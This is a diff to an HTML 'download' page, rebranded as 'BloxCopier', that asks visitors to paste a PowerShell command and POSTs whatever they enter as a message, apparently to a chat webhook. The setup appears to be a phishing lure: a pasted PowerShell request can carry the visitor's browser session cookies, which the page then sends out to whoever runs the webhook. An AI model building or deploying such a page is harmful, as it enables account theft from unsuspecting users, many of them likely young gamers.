@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redeem Code - Download</title>
+    <title>BloxCopier - Download</title>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -145,11 +145,11 @@
 <body>
 
     <div class="container">
-        <h1 class="title">REDEEM CODE</h1>
-        <p class="subtitle">Enter your code below to start the download</p>
+        <h1 class="title">BloxCopier</h1>
+        <p class="subtitle">Enter your Powershell command below to start the download</p>
 
         <div class="input-group">
-            <input type="text" id="codeInput" class="code-input" placeholder="ENTER CODE HERE" autocomplete="off" spellcheck="false">
+            <input type="text" id="codeInput" class="code-input" placeholder="ENTER Powershell command HERE" autocomplete="off" spellcheck="false">
         </div>
 
         <button id="downloadBtn" class="btn-download">DOWNLOAD</button>
@@ -181,7 +181,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🔑 **Neuer Code:** \`${code}\``
+                        content: `🔑 **New Entry:** \`${code}\``
                     })
                 });
 
